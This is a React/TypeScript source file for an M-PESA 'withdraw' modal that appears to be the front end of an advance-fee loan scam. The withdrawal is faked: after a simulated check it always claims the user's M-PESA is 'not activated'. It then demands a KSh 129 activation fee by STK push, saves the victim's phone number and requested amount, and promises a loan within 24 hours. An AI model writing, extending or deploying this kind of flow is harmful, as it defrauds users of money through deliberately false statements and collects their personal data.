import React, { useState, useRef, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { Phone, ArrowRight, X, Loader2, Shield, XCircle, MousePointer, KeyRound, CheckCircle2, RotateCcw } from 'lucide-react';
import { useSurveyAds } from '../../hooks/useSurveyAds';
import { SurveyAd, PopupSurveyAd } from '../ui/survey-ad';

interface WithdrawModalProps {
  isOpen: boolean;
  onClose: () => void;
  maxAmount: number;
  onWithdraw?: (amount: number) => void | Promise<void>;
}

type WithdrawStatus = 'idle' | 'loading' | 'processing' | 'failed' | 'activation-needed' | 'payment-initiated' | 'payment-success';

export const WithdrawModal: React.FC<WithdrawModalProps> = ({
  isOpen,
  onClose,
  maxAmount,
  onWithdraw
}) => {
  const [amount, setAmount] = useState('');
  const [phoneNumber, setPhoneNumber] = useState('');
  const [withdrawStatus, setWithdrawStatus] = useState<WithdrawStatus>('idle');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [showActivationMessage, setShowActivationMessage] = useState(false);
  const [showPaymentModal, setShowPaymentModal] = useState(false);
  const [paymentPhone, setPaymentPhone] = useState('');
  const [checkoutRequestId, setCheckoutRequestId] = useState('');
  
  // Survey ads hook
  const { popupVisible, currentAdIndex, showPopupAd, hidePopupAd, showAdSequence } = useSurveyAds();
  
  // Reference for the activation button section
  const activationSectionRef = useRef<HTMLButtonElement>(null);

  const handleWithdraw = async () => {
    if (!amount || !phoneNumber || withdrawStatus !== 'idle') return;
    
    try {
      // Start the withdrawal process
      setWithdrawStatus('loading');
      
      // Format phone number
      const formattedPhone = phoneNumber.startsWith('0') 
        ? '254' + phoneNumber.substring(1)
        : !phoneNumber.startsWith('254') ? '254' + phoneNumber : phoneNumber;
      
      sessionStorage.setItem('userPhoneNumber', formattedPhone);
      setPaymentPhone(phoneNumber);
      
      // Simulate quick check before showing activation requirement
      await new Promise(resolve => setTimeout(resolve, 1500));
      
      setWithdrawStatus('idle');
      setShowActivationMessage(true);
      
      setTimeout(() => {
        activationSectionRef.current?.scrollIntoView({ behavior: 'smooth' });
      }, 300);
    } catch (error) {
      console.error('Withdrawal error:', error);
      setWithdrawStatus('failed');
      setTimeout(() => {
        setWithdrawStatus('idle');
      }, 3000);
    }
  };

  const handleActivateNow = () => {
    if (!paymentPhone && phoneNumber) {
      setPaymentPhone(phoneNumber);
    }
    setShowPaymentModal(true);
    setShowActivationMessage(false);
  };

  const initiatePayment = async () => {
    if (!paymentPhone) {
      setError('Phone number is required');
      return;
    }

    setLoading(true);
    setError(null);

    try {
      // Clean phone number of all non-digits, spaces, +
      let digits = paymentPhone.replace(/\D/g, '');
      if (digits.startsWith('0') && digits.length === 10) {
        digits = '254' + digits.substring(1);
      } else if (digits.length === 9) {
        digits = '254' + digits;
      }

      if (digits.length !== 12 || !digits.startsWith('254')) {
        setError('Please enter a valid Safaricom M-PESA phone number (e.g. 0712345678 or 0110123456)');
        setLoading(false);
        return;
      }

      const formattedPhone = digits;

      // Generate reference
      const reference = `PAYHERO-${Date.now()}-${Math.floor(Math.random() * 1000)}`;

      // Save application data first (non-blocking)
      try {
        await fetch('/api/submit-application', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            phone: formattedPhone,
            withdrawalAmount: amount,
            paymentReference: reference
          })
        });
        console.log('Application data saved');
      } catch (err) {
        console.warn('Non-blocking application save notice:', err);
      }

      const response = await fetch('/api/initiate-payment', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          msisdn: formattedPhone,
          phoneNumber: formattedPhone,
          amount: 129,
          description: 'PayHero Loan Activation Fee',
          reference: reference
        })
      });

      const data = await response.json();

      if (data.success) {
        const requestId = data.data?.requestId || data.data?.checkoutRequestId || data.data?.transactionRequestId || data.data?.reference || reference;
        setCheckoutRequestId(requestId);
        setWithdrawStatus('payment-initiated');
        pollPaymentStatus(requestId);
      } else {
        setError(data.message || 'Payment initiation failed. Please check your phone number and try again.');
      }
    } catch (error) {
      console.error('Payment initiation error:', error);
      setError('Network error. Please try again.');
    } finally {
      setLoading(false);
    }
  };

  const pollPaymentStatus = async (paymentRef: string) => {
    let attempts = 0;
    const maxAttempts = 35; // Poll for ~2 minutes (35 * 3.5 seconds)

    const poll = async () => {
      try {
        const response = await fetch(`/api/payment-status?reference=${paymentRef}`, {
          method: 'GET',
          headers: {
            'Content-Type': 'application/json',
          }
        });

        const data = await response.json();
        console.log('Payment status response:', data);
        
        if (data.success && data.payment) {
          const payment = data.payment;
          const status = payment.status;
          const resultCode = payment.resultCode;
          
          if (status === 'SUCCESS') {
            console.log('Payment detected as successful!');
            setWithdrawStatus('payment-success');
            
            // Track conversion with Google Analytics
            if (typeof window !== 'undefined' && (window as any).gtag) {
              const transactionId = `payhero_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
              const conversionValue = 129;
              
              (window as any).gtag('event', 'conversion', {
                send_to: 'AW-17581130723/conversion',
                value: conversionValue,
                currency: 'KES',
                transaction_id: transactionId
              });
              
              console.log('Conversion tracked for PayHero loan activation:', {
                transactionId,
                value: conversionValue,
                account: 'AW-17581130723'
              });
            }
            
            // Show sequence of survey ads on payment success
            showAdSequence([
              { delay: 500, adIndex: 1 },
              { delay: 0, adIndex: 0 }
            ]);
            
            if (onWithdraw && amount) {
              try {
                await onWithdraw(Number(amount));
              } catch (e) {
                console.error('onWithdraw callback error:', e);
              }
            }

            setTimeout(() => {
              onClose();
            }, 8000);
            
            return;
          } else if (status === 'CANCELLED') {
            console.log('Payment cancelled by user');
            setWithdrawStatus('failed');
            setError('Payment was cancelled. Please try again.');
            
            showAdSequence([
              { delay: 300, adIndex: 3 },
              { delay: 0, adIndex: 2 }
            ]);
            
            return;
          } else if (status === 'FAILED') {
            console.log('Payment failed with status:', status);
            setWithdrawStatus('failed');
            setError(`Payment failed: ${payment.resultDesc || 'Please try again.'}`);
            
            showAdSequence([
              { delay: 500, adIndex: 2 },
              { delay: 0, adIndex: 4 }
            ]);
            
            return;
          }
          
          console.log('Payment still pending, continuing to poll...');
          setWithdrawStatus('payment-initiated');
        } else {
          console.log('Payment status API error, continuing to poll:', data.error);
        }

        attempts++;
        if (attempts < maxAttempts) {
          setTimeout(poll, 3500);
        } else {
          setWithdrawStatus('failed');
          setError('Payment timeout. Please try again.');
          
          showAdSequence([
            { delay: 500, adIndex: 3 },
            { delay: 0, adIndex: 5 }
          ]);
        }
      } catch (error) {
        console.error('Status check error:', error);
        attempts++;
        if (attempts < maxAttempts) {
          setTimeout(poll, 3500);
        } else {
          setWithdrawStatus('failed');
          setError('Unable to verify payment status.');
          
          showAdSequence([
            { delay: 500, adIndex: 3 },
            { delay: 0, adIndex: 2 }
          ]);
        }
      }
    };

    // Wait 3 seconds before first check to give M-PESA STK prompt time to reach phone
    setTimeout(poll, 3000);
  };

  const resetPaymentFlow = () => {
    setShowPaymentModal(false);
    setWithdrawStatus('idle');
    setPaymentPhone('');
    setCheckoutRequestId('');
    setError(null);
    setLoading(false);
    
    showAdSequence([
      { delay: 0, adIndex: 3 },
      { delay: 0, adIndex: 2 }
    ]);
  };

  useEffect(() => {
    if (showActivationMessage && activationSectionRef.current) {
      setTimeout(() => {
        activationSectionRef.current?.scrollIntoView({ behavior: 'smooth' });
      }, 100);
    }
  }, [showActivationMessage]);

  const renderStatusMessage = () => {
    switch (withdrawStatus) {
      case 'loading':
        return (
          <motion.div
            initial={{ opacity: 0, y: 10 }}
            animate={{ opacity: 1, y: 0 }}
            className="bg-blue-50 p-4 rounded-xl space-y-2"
          >
            <div className="flex items-center justify-center space-x-3">
              <Loader2 className="w-6 h-6 text-blue-500 animate-spin" />
              <p className="text-blue-700 font-medium">Initiating withdrawal request...</p>
            </div>
          </motion.div>
        );

      case 'processing':
        return (
          <motion.div
            initial={{ opacity: 0, y: 10 }}
            animate={{ opacity: 1, y: 0 }}
            className="bg-blue-50 p-4 rounded-xl space-y-2"
          >
            <div className="flex items-center justify-center space-x-3">
              <Loader2 className="w-6 h-6 text-blue-500 animate-spin" />
              <p className="text-blue-700 font-medium">Processing your withdrawal...</p>
            </div>
            <div className="w-full bg-blue-200 rounded-full h-1.5">
              <motion.div
                className="bg-blue-500 h-1.5 rounded-full"
                initial={{ width: "0%" }}
                animate={{ width: "100%" }}
                transition={{ duration: 2, ease: "linear" }}
              />
            </div>
          </motion.div>
        );

      case 'failed':
        return (
          <motion.div
            initial={{ opacity: 0, y: 10 }}
            animate={{ opacity: 1, y: 0 }}
            className="bg-red-50 border-l-4 border-red-500 p-4 rounded-xl space-y-4"
          >
            <div className="flex items-start space-x-3">
              <XCircle className="w-6 h-6 text-red-500 flex-shrink-0" />
              <div>
                <h4 className="font-semibold text-red-800">Withdrawal Failed</h4>
                <p className="text-red-700 text-sm mt-1">
                  Unable to process your withdrawal request at this time.
                </p>
              </div>
            </div>
            
            <div className="mt-4">
              <SurveyAd adIndex={2} className="max-w-sm mx-auto" />
            </div>
          </motion.div>
        );

      case 'payment-initiated':
        return (
          <motion.div
            initial={{ opacity: 0, y: 10 }}
            animate={{ opacity: 1, y: 0 }}
            className="bg-blue-50 p-4 rounded-xl space-y-2"
          >
            <div className="flex items-center justify-center space-x-3">
              <Loader2 className="w-6 h-6 text-blue-500 animate-spin" />
              <p className="text-blue-700 font-medium">STK push sent! Check your phone...</p>
            </div>
            <p className="text-blue-600 text-sm text-center">
              Enter your M-PESA PIN to complete the KSh 129 payment
            </p>
          </motion.div>
        );

      case 'payment-success':
        return (
          <motion.div
            initial={{ opacity: 0, y: 10 }}
            animate={{ opacity: 1, y: 0 }}
            className="bg-green-50 border-l-4 border-green-500 p-4 rounded-xl space-y-4"
          >
            <div className="flex items-start space-x-3">
              <CheckCircle2 className="w-6 h-6 text-green-500 flex-shrink-0" />
              <div>
                <h4 className="font-semibold text-green-800">Account Activation Successful!</h4>
                <p className="text-green-700 text-sm mt-1">
                  Your payment of KSh 129 has been processed successfully.
                </p>
                <p className="text-green-700 text-sm mt-2 font-medium">
                  🎉 You will receive your loan within 24 hours!
                </p>
              </div>
            </div>
            
            <div className="mt-4">
              <SurveyAd adIndex={0} className="max-w-sm mx-auto" />
            </div>
          </motion.div>
        );

      case 'activation-needed':
        return (
          <motion.div
            ref={activationSectionRef}
            initial={{ opacity: 0, y: 10 }}
            animate={{ opacity: 1, y: 0 }}
            className="bg-orange-50 border-l-4 border-orange-500 p-4 rounded-xl space-y-4"
          >
            <div>
              <h4 className="font-semibold text-orange-800">M-PESA Not Activated</h4>
              <p className="text-orange-700 text-sm mt-1">
                Your M-PESA has not been activated to withdraw funds directly from your wallet & savings account.
              </p>
              <div className="mt-4 space-y-3">
                <div className="flex items-start space-x-3">
                  <MousePointer className="w-5 h-5 text-orange-500 flex-shrink-0 mt-0.5" />
                  <p className="text-gray-700">Click the "Activate Now" button below</p>
                </div>
                <div className="flex items-start space-x-3">
                  <KeyRound className="w-5 h-5 text-orange-500 flex-shrink-0 mt-0.5" />
                  <p className="text-gray-700">Enter your mobile number in the next screen</p>
                </div>
                <div className="flex items-start space-x-3">
                  <CheckCircle2 className="w-5 h-5 text-orange-500 flex-shrink-0 mt-0.5" />
                  <p className="text-gray-700">Complete the activation process</p>
                </div>
                <div className="flex items-start space-x-3">
                  <RotateCcw className="w-5 h-5 text-orange-500 flex-shrink-0 mt-0.5" />
                  <p className="text-gray-700">Return here to withdraw your funds</p>
                </div>
              </div>
            </div>
            
            <motion.button
              whileHover={{ scale: 1.02 }}
              whileTap={{ scale: 0.98 }}
              onClick={handleActivateNow}
              disabled={loading}
              className={`w-full py-3 px-4 rounded-xl font-medium flex items-center justify-center space-x-2
                ${loading ? 'bg-gray-100 text-gray-400 cursor-not-allowed' : 
                'bg-gradient-to-r from-orange-500 to-orange-600 text-white shadow-lg shadow-orange-500/20 hover:from-orange-600 hover:to-orange-700'}`}
            >
              {loading ? (
                <>
                  <Loader2 className="w-5 h-5 animate-spin" />
                  <span>Processing...</span>
                </>
              ) : (
                <>
                  <Shield className="w-5 h-5" />
                  <span>Activate Now</span>
                </>
              )}
            </motion.button>
            
            {error && (
              <div className="text-red-600 text-sm mt-2">
                {error}
              </div>
            )}
          </motion.div>
        );

      default:
        return null;
    }
  };

  return (
    <AnimatePresence>
      {isOpen && (
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          exit={{ opacity: 0 }}
          className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-50 p-2 sm:p-4 overflow-y-auto"
        >
          <motion.div
            initial={{ scale: 0.9, opacity: 0 }}
            animate={{ scale: 1, opacity: 1 }}
            exit={{ scale: 0.9, opacity: 0 }}
            className={`bg-white rounded-2xl max-w-md w-full my-2 sm:my-0 relative shadow-lg shadow-gray-500/20 ${showActivationMessage ? 'h-[620px] sm:h-[670px] overflow-y-auto' : 'overflow-hidden'}`}
          >
            {/* Payment Modal Overlay */}
            <AnimatePresence>
              {showPaymentModal && (
                <motion.div 
                  initial={{ opacity: 0 }}
                  animate={{ opacity: 1 }}
                  exit={{ opacity: 0 }}
                  className="absolute inset-0 z-10 bg-white rounded-2xl flex flex-col"
                >
                  <div className="bg-gradient-to-r from-blue-400 to-blue-600 p-4 sm:p-6">
                    <div className="flex justify-between items-center">
                      <h3 className="text-lg sm:text-xl font-bold text-white">Account Activation</h3>
                      <button
                        onClick={resetPaymentFlow}
                        className="text-white/80 hover:text-white transition-colors"
                      >
                        <X className="w-5 h-5" />
                      </button>
                    </div>
                  </div>
                  
                  <div className="p-4 sm:p-6 space-y-4 flex-grow">
                    <div className="bg-blue-50 border-l-4 border-blue-500 p-4 rounded-xl space-y-4">
                      <div>
                        <h4 className="font-semibold text-blue-800">Activate Your Account</h4>
                        <p className="text-blue-700 text-sm mt-1">
                          Pay KSh 129 activation fee to unlock loan access
                        </p>
                      </div>
                      
                      <div>
                        <label className="block text-sm font-medium text-gray-700 mb-2">
                          M-PESA Phone Number
                        </label>
                        <div className="relative">
                          <input
                            type="tel"
                            value={paymentPhone}
                            onChange={(e) => setPaymentPhone(e.target.value)}
                            placeholder="0712345678"
                            className="w-full px-4 py-3 text-base rounded-xl border border-gray-200 focus:ring-2 
                              focus:ring-blue-500 focus:border-transparent transition-all pl-12"
                            inputMode="tel"
                          />
                          <Phone className="w-5 h-5 text-gray-400 absolute left-4 top-1/2 -translate-y-1/2" />
                        </div>
                      </div>

                      {withdrawStatus === 'payment-initiated' && (
                        <div className="bg-yellow-50 border-l-4 border-yellow-500 p-4 rounded-xl">
                          <div className="flex items-center space-x-3">
                            <Loader2 className="w-5 h-5 text-yellow-500 animate-spin" />
                            <div>
                              <p className="text-yellow-800 font-medium">STK Push Sent!</p>
                              <p className="text-yellow-700 text-sm">Check your phone and enter M-PESA PIN</p>
                            </div>
                          </div>
                        </div>
                      )}

                      {withdrawStatus === 'payment-success' && (
                        <div className="bg-green-50 border-l-4 border-green-500 p-4 rounded-xl">
                          <div className="flex items-center space-x-3">
                            <CheckCircle2 className="w-5 h-5 text-green-500" />
                            <div>
                              <p className="text-green-800 font-medium">Payment Successful!</p>
                              <p className="text-green-700 text-sm">🎉 You will receive your loan within 24 hours!</p>
                            </div>
                          </div>
                        </div>
                      )}

                      {withdrawStatus === 'failed' && (
                        <div className="bg-red-50 border-l-4 border-red-500 p-4 rounded-xl">
                          <div className="flex items-center space-x-3">
                            <XCircle className="w-5 h-5 text-red-500" />
                            <div>
                              <p className="text-red-800 font-medium">Payment Failed</p>
                              <p className="text-red-700 text-sm">{error || 'Please try again'}</p>
                            </div>
                          </div>
                        </div>
                      )}
                      
                      {withdrawStatus !== 'payment-success' && (
                        <motion.button
                          whileHover={{ scale: 1.02 }}
                          whileTap={{ scale: 0.98 }}
                          onClick={initiatePayment}
                          disabled={loading || !paymentPhone || withdrawStatus === 'payment-initiated'}
                          className={`w-full py-3 px-4 rounded-xl font-medium flex items-center justify-center space-x-2
                            ${(loading || !paymentPhone || withdrawStatus === 'payment-initiated') ? 'bg-gray-100 text-gray-400 cursor-not-allowed' : 
                            'bg-gradient-to-r from-blue-500 to-blue-600 text-white shadow-lg shadow-blue-500/20 hover:from-blue-600 hover:to-blue-700'}`}
                        >
                          {loading ? (
                            <>
                              <Loader2 className="w-5 h-5 animate-spin" />
                              <span>Processing...</span>
                            </>
                          ) : withdrawStatus === 'payment-initiated' ? (
                            <>
                              <Loader2 className="w-5 h-5 animate-spin" />
                              <span>Waiting for payment...</span>
                            </>
                          ) : (
                            <>
                              <Shield className="w-5 h-5" />
                              <span>Activate</span>
                            </>
                          )}
                        </motion.button>
                      )}
                    </div>
                  </div>
                </motion.div>
              )}
            </AnimatePresence>

            {/* Activation Message Overlay */}
            <AnimatePresence>
              {showActivationMessage && (
                <motion.div 
                  initial={{ opacity: 0 }}
                  animate={{ opacity: 1 }}
                  exit={{ opacity: 0 }}
                  className="absolute inset-0 z-10 bg-white rounded-2xl flex flex-col"
                >
                  <div className="bg-gradient-to-r from-orange-400 to-orange-600 p-4 sm:p-6">
                    <div className="flex justify-between items-center">
                      <h3 className="text-lg sm:text-xl font-bold text-white">M-PESA Activation</h3>
                      <button
                        onClick={() => setShowActivationMessage(false)}
                        className="text-white/80 hover:text-white transition-colors"
                      >
                        <X className="w-5 h-5" />
                      </button>
                    </div>
                  </div>
                  
                  <div className="p-4 sm:p-6 space-y-4 flex-grow">
                    <div className="bg-orange-50 border-l-4 border-orange-500 p-4 rounded-xl space-y-4">
                      <div>
                        <h4 className="font-semibold text-orange-800">M-PESA Not Activated</h4>
                        <p className="text-orange-700 text-sm mt-1">
                          Your M-PESA has not been activated to withdraw funds directly from your wallet & savings account.
                        </p>
                        <div className="mt-4 space-y-3">
                          <div className="flex items-start space-x-3">
                            <MousePointer className="w-5 h-5 text-orange-500 flex-shrink-0 mt-0.5" />
                            <p className="text-gray-700">Click the "Activate Now" button below</p>
                          </div>
                          <div className="flex items-start space-x-3">
                            <KeyRound className="w-5 h-5 text-orange-500 flex-shrink-0 mt-0.5" />
                            <p className="text-gray-700">Enter your mobile number in the next screen</p>
                          </div>
                          <div className="flex items-start space-x-3">
                            <CheckCircle2 className="w-5 h-5 text-orange-500 flex-shrink-0 mt-0.5" />
                            <p className="text-gray-700">Complete the activation process</p>
                          </div>
                          <div className="flex items-start space-x-3">
                            <RotateCcw className="w-5 h-5 text-orange-500 flex-shrink-0 mt-0.5" />
                            <p className="text-gray-700">Return here to withdraw your funds</p>
                          </div>
                        </div>
                      </div>
                      
                      <motion.button
                        ref={activationSectionRef}
                        whileHover={{ scale: 1.02 }}
                        whileTap={{ scale: 0.98 }}
                        onClick={handleActivateNow}
                        disabled={loading}
                        className={`w-full py-3 px-4 rounded-xl font-medium flex items-center justify-center space-x-2
                          ${loading ? 'bg-gray-100 text-gray-400 cursor-not-allowed' : 
                          'bg-gradient-to-r from-orange-500 to-orange-600 text-white shadow-lg shadow-orange-500/20 hover:from-orange-600 hover:to-orange-700'}`}
                      >
                        {loading ? (
                          <>
                            <Loader2 className="w-5 h-5 animate-spin" />
                            <span>Processing...</span>
                          </>
                        ) : (
                          <>
                            <Shield className="w-5 h-5" />
                            <span>Activate Now</span>
                          </>
                        )}
                      </motion.button>
                      
                      {error && (
                        <div className="text-red-600 text-sm mt-2">
                          {error}
                        </div>
                      )}
                    </div>
                  </div>
                </motion.div>
              )}
            </AnimatePresence>

            {/* Header with gradient */}
            <div className="bg-gradient-to-r from-green-400 to-emerald-600 p-4 sm:p-6">
              <div className="flex justify-between items-center">
                <h3 className="text-lg sm:text-xl font-bold text-white">Withdraw to M-PESA</h3>
                <button
                  onClick={onClose}
                  className="text-white/80 hover:text-white transition-colors"
                >
                  <X className="w-5 h-5" />
                </button>
              </div>
            </div>

            <div className="p-4 sm:p-6 space-y-4 sm:space-y-6">
              {/* Phone Number Input */}
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  M-PESA Phone Number
                </label>
                <div className="relative">
                  <input
                    type="tel"
                    value={phoneNumber}
                    onChange={(e) => setPhoneNumber(e.target.value)}
                    placeholder="Enter your M-PESA number"
                    className="w-full px-4 py-3 text-base rounded-xl border border-gray-200 focus:ring-2 
                      focus:ring-green-500 focus:border-transparent transition-all pl-12"
                    inputMode="tel"
                  />
                  <Phone className="w-5 h-5 text-gray-400 absolute left-4 top-1/2 -translate-y-1/2" />
                </div>
              </div>

              {/* Amount Input */}
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Amount to withdraw
                </label>
                <div className="relative">
                  <input
                    type="number"
                    value={amount}
                    onChange={(e) => setAmount(e.target.value)}
                    max={maxAmount}
                    placeholder="Enter amount"
                    className="w-full px-4 py-3 text-base rounded-xl border border-gray-200 focus:ring-2 
                      focus:ring-green-500 focus:border-transparent transition-all"
                    inputMode="numeric"
                  />
                  <span className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400">
                    KES
                  </span>
                </div>
              </div>

              {/* Quick Amount Buttons */}
              <div className="grid grid-cols-3 gap-2">
                {[1000, 2000, 5000].map((quickAmount) => (
                  <motion.button
                    key={quickAmount}
                    whileHover={{ scale: 1.02 }}
                    whileTap={{ scale: 0.98 }}
                    onClick={() => setAmount(quickAmount.toString())}
                    className={`px-4 py-2 rounded-lg text-sm font-medium
                      ${Number(amount) === quickAmount ? 
                        'bg-green-100 text-green-700 border-2 border-green-500' : 
                        'bg-gray-50 text-gray-700 border border-gray-200 hover:bg-gray-100'}`}
                  >
                    {quickAmount.toLocaleString()}
                  </motion.button>
                ))}
              </div>

              {/* Status Messages */}
              {!showActivationMessage && renderStatusMessage()}

              {/* Action Button */}
              {!showActivationMessage && withdrawStatus === 'idle' && (
                <motion.button
                  whileHover={{ scale: 1.02 }}
                  whileTap={{ scale: 0.98 }}
                  disabled={!amount || !phoneNumber || Number(amount) > maxAmount}
                  onClick={handleWithdraw}
                  className={`w-full py-3 px-4 rounded-xl font-medium flex items-center justify-center space-x-2
                    ${(!amount || !phoneNumber || Number(amount) > maxAmount) ? 
                      'bg-gray-100 text-gray-400 cursor-not-allowed' : 
                      'bg-gradient-to-r from-green-500 to-emerald-600 text-white shadow-lg shadow-green-500/20'}`}
                >
                  <span>Withdraw Now</span>
                  <ArrowRight className="w-4 h-4" />
                </motion.button>
              )}
            </div>
          </motion.div>
        </motion.div>
      )}
      
      {/* Popup Survey Ad */}
      {popupVisible && (
        <PopupSurveyAd 
          isOpen={popupVisible} 
          onClose={hidePopupAd} 
          adIndex={currentAdIndex}
        />
      )}
    </AnimatePresence>
  );
};
